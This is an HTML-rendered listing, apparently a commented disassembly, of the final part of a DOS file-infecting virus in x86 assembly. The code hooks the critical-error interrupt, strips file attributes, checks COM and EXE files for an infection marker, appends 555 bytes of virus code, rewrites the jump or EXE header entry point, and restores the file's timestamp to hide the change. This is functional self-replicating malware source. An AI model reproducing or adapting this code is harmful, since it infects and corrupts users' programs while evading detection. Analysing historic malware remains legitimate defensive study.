        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HOOK_INT</span><span class="sc0">                </span><span class="sc1">;Hook INT 24h (Error Handler)</span><span class="sc0">
                        </span><span class="sc1">;New address = CS:0D1h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">INT_24H_OFF</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;save Original INT 24h offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">INT_24H_SEG</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">;save Original INT 24h handler</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                             </span><span class="sc1">;Enable interrupts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">FILE_ATTRIB</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">      </span><span class="sc1">;save INT 24h INT table address??</span><span class="sc0">

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Save File Attributes</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">              </span><span class="sc1">;DOS Services  ah=function 43h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   </span><span class="sc1">;get attrb cx, filename @ds:dx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CLEAR</span><span class="sc0">                 </span><span class="sc1">;Jump if zero</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">FILE_ATTRIB</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">     </span><span class="sc1">;save attributes</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">               </span><span class="sc1">;clear attributes</span><span class="sc0">

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Clear File Attributes</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">              </span><span class="sc1">;DOS Services  ah=function 43h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   </span><span class="sc1">;set attrb cx, filename @ds:dx</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">OUTTAHEA</span><span class="sc0">              </span><span class="sc1">;Jump if carry Set</span><span class="sc0">

</span><span class="sc5">CLEAR</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Open File</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">              </span><span class="sc1">;DOS Services  ah=function 3Dh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   </span><span class="sc1">;open file, al=mode,name@ds:dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                 </span><span class="sc1">;File Handle =&gt; AX</span><span class="sc0">

</span><span class="sc1">;***************************************************                </span><span class="sc0">
</span><span class="sc1">; Read File</span><span class="sc0">
</span><span class="sc1">; NOTE: TIME &amp; DATE should be saved at this stage!</span><span class="sc0">
</span><span class="sc1">;***************************************************</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;save CS</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;restore DS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                  </span><span class="sc1">;DOS Services  ah=function 3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">FILE_BUFFER</span><span class="sc0">          </span><span class="sc1">;BUFFER OFFSET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                  </span><span class="sc1">;Read 28 bytes</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;read file, bx=file handle</span><span class="sc0">
                        </span><span class="sc1">;cx=bytes to ds:dx buffer</span><span class="sc0">
        
</span><span class="sc1">;*********************************                </span><span class="sc0">
</span><span class="sc1">; Save Time and Date. (Too late!)</span><span class="sc0">
</span><span class="sc1">;*********************************</span><span class="sc0">
        
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CHECK_FO_INFECTION</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc0">      </span><span class="sc1">;Jump if zero (zero = infected)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">;DOS Services  ah=function 57h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;get file date+time, bx=handle</span><span class="sc0">
                        </span><span class="sc1">;returns cx=time, dx=time</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_TIME</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">;save time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_DATE</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">         </span><span class="sc1">;save date</span><span class="sc0">

</span><span class="sc1">;*******************************                </span><span class="sc0">
</span><span class="sc1">; File PRT @ EOF</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                </span><span class="sc1">;DOS Services  ah=function 42h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Zero register</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;Zero register</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;move file ptr, bx=file handle</span><span class="sc0">
                        </span><span class="sc1">;al=method, cx,dx=offset</span><span class="sc0">

</span><span class="sc1">;*******************************                </span><span class="sc0">
</span><span class="sc1">; Write VIRUS</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;save file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save file size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;DOS Services  ah=function 40h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;write from DS:0000</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VIRUS_SIZE</span><span class="sc0">           </span><span class="sc1">;cx = 555 bytes = QUIT code</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;write file  bx=file handle</span><span class="sc0">
                        </span><span class="sc1">;cx=bytes from ds:dx buffer</span><span class="sc0">

        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;555 bytes written?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore file size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;restore file size</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc0">    </span><span class="sc1">;Restore attribs if didn't write 555 bytes</span><span class="sc0">
        
</span><span class="sc1">;*******************************                </span><span class="sc0">
</span><span class="sc1">; File PRT @ Beginning of File</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FIX_HEADER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                </span><span class="sc1">;DOS Services  ah=function 42h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Zero register</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                   </span><span class="sc1">;Zero register</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;move file ptr, bx=file handle</span><span class="sc0">
                        </span><span class="sc1">;al=method, cx,dx=offset</span><span class="sc0">

</span><span class="sc1">;*******************************                </span><span class="sc0">
</span><span class="sc1">; Write new jump / Header</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;DOS Services  ah=function 40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">FILE_BUFFER</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                  </span><span class="sc1">;Write 28 bytes</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;write file  bx=file handle</span><span class="sc0">
                        </span><span class="sc1">;cx=bytes from ds:dx buffer</span><span class="sc0">

</span><span class="sc1">;*******************************                </span><span class="sc0">
</span><span class="sc1">; Restore Date &amp; time (DUH!)</span><span class="sc0">
</span><span class="sc1">;*******************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                </span><span class="sc1">;DOS Services  ah=function 57h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_TIME</span><span class="sc0">         </span><span class="sc1">;get time =&gt; cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_DATE</span><span class="sc0">         </span><span class="sc1">;get date =&gt; dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;set file date+time, bx=handle</span><span class="sc0">
                        </span><span class="sc1">;cx=time, dx=time</span><span class="sc0">
</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Restore File Attributes</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

</span><span class="sc5">RESTORE_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                    </span><span class="sc1">;get filename pointer from stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;get filename pointer from stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">FILE_ATTRIB</span><span class="sc0">     </span><span class="sc1">;get saved attributes</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">               </span><span class="sc1">;restore attributes</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CLOSE_FILE</span><span class="sc0">            </span><span class="sc1">;Jump if zero</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">              </span><span class="sc1">;set attrb cx, filename @ds:dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     

</span><span class="sc1">;*************************                </span><span class="sc0">
</span><span class="sc1">; Close File Handler</span><span class="sc0">
</span><span class="sc1">;*************************</span><span class="sc0">

</span><span class="sc5">CLOSE_FILE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">;DOS Services  ah=function 3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">;close file, bx=file handle</span><span class="sc0">


</span><span class="sc1">;*******************************************                </span><span class="sc0">
</span><span class="sc1">; Restore INT 24h (critical Error Handler)</span><span class="sc0">
</span><span class="sc1">;*******************************************</span><span class="sc0">

</span><span class="sc5">SEE_YA</span><span class="sc4">:</span><span class="sc0">         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">INT_24H_OFF</span><span class="sc0">    </span><span class="sc1">;Restore Original INT 24h offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">INT_24H_SEG</span><span class="sc0">    </span><span class="sc1">;Restore Original INT 24h Segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">               </span><span class="sc1">;INT 24h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RESTORE_INT</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                          </span><span class="sc1">;Enable interrupts</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;restore registers</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">INT_21H</span><span class="sc0">    </span><span class="sc1">;jump to Original INT 21h</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; ROUTINE - Check for possible File infection</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">CHECK_FO_INFECTION</span><span class="sc4">:</span><span class="sc0">           
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_BUFFER</span><span class="sc4">,</span><span class="sc2">5A4Dh</span><span class="sc0">  </span><span class="sc1">;EXE File?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CHECK_EXE</span><span class="sc0">                      </span><span class="sc1">;Check EXE</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">REMAINDER</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc0">   </span><span class="sc1">;COM Infected?</span><span class="sc0">

</span><span class="sc5">GO_BACK</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">CHECK_EXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">EXE_ID</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc0">    </span><span class="sc1">;EXE Infected?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">GO_BACK</span><span class="sc0">                    </span><span class="sc1">;Jump if equal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">MAX_NUM_PAR</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;High memory allocation?</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; ROUTINE - FIX NEW COM START / EXE HEADER</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">

</span><span class="sc5">FIX_HEADER</span><span class="sc4">:</span><span class="sc0">           

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_BUFFER</span><span class="sc4">,</span><span class="sc2">5A4Dh</span><span class="sc0">      </span><span class="sc1">;EXE file?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">DO_EXE</span><span class="sc0">                             </span><span class="sc1">;Jump if equal</span><span class="sc0">

</span><span class="sc1">;**************************                </span><span class="sc0">
</span><span class="sc1">; FIX new COM file entry</span><span class="sc0">
</span><span class="sc1">;**************************</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_BUFFER</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">     </span><span class="sc1">;insert new JUMP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">REMAINDER</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc0">     </span><span class="sc1">;Insert Infection ID</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc0">                           </span><span class="sc1">;add 43 to filesize (skip data area)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_BUFFER</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;insert new jump address</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                                     </span><span class="sc1">;return</span><span class="sc0">

</span><span class="sc5">DO_EXE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">42Bh</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">0D6h</span><span class="sc0">                </span><span class="sc1">;mov     dh,dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Rotate thru carry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">REMAINDER</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;Insert load module's remainder</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">FILE_SIZE</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;New load module size</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Shift w/zeros fill</span><span class="sc0">
        </span><span class="sc6">rcl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">; Rotate thru carry</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3FDh</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                      </span><span class="sc1">;multiply DX by 16</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">HEADER_SIZE</span><span class="sc0">          </span><span class="sc1">;Get Header Size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">STACK_SEG</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">            </span><span class="sc1">;New SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">CODE_SEG</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">;New CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">INST_PTR</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">;New IP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                       </span><span class="sc1">;AX = New SP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">STACK_POINTER</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">;NEW SP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">EXE_ID</span><span class="sc4">,</span><span class="sc2">0F1h</span><span class="sc0">    </span><span class="sc1">;insert Infection ID</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                               </span><span class="sc1">;return</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc1">; ROUTINE - HOOK INTERRUPT</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; INPUT:</span><span class="sc0">
</span><span class="sc1">; Hook interrupt at INT TABLE ADDRESS: 0000:00 BL</span><span class="sc0">
</span><span class="sc1">; New INT address = CX:AX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; OUTPUT:</span><span class="sc0">
</span><span class="sc1">; OLD INT address = CX:AX</span><span class="sc0">
</span><span class="sc1">;*****************************************************************************</span><span class="sc0">


</span><span class="sc5">HOOK_INT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;save CX</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;Zero register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">;ES = 0</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;Restore CX</span><span class="sc0">

</span><span class="sc1">;=-=-[External Entry Point]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</span><span class="sc0">

</span><span class="sc5">RESTORE_INT</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                    </span><span class="sc1">;BH = 0</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">;Disable interrupts</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;ax &lt;=&gt; ES:[00BL]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">;ax &lt;=&gt; ES:[00BL + 2]</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">                            </span><span class="sc1">;return</span><span class="sc0">

</span><span class="sc1">;*****************************************************************************</span><span class="sc0">
</span><span class="sc5">ENDVIRUS</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;last byte of virus</span><span class="sc0">


</span><span class="sc5">VIRUS</span><span class="sc0">           </span><span class="sc9">ENDS</span><span class="sc0">
        </span><span class="sc9">END</span><span class="sc0">     </span><span class="sc5">HOST</span><span class="sc0">
</span></div></body>
</html>
